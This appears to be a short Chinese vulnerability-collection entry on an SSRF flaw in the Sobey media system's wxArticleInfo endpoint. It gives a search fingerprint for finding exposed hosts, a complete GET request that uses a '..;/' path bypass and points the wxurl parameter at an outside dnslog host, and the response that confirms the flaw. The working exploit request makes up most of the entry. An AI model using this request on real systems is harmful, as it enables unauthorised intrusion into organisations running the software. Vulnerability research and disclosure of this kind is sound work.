# 索贝融媒体系统wxArticleInfo存在SSRF漏洞

索贝融媒体系统 ｜ SSRF ｜ —
- **指纹**：`body="/Sc-TaskMonitoring/"`
- **请求**：`GET /sobey-mchEditor/js/..;/mch/WXArticleInt/wxArticleInfo?siteCode=1&token=1&wxurl=http://dnslog.org HTTP/1.1`
- **响应特征**：200 dnslog回显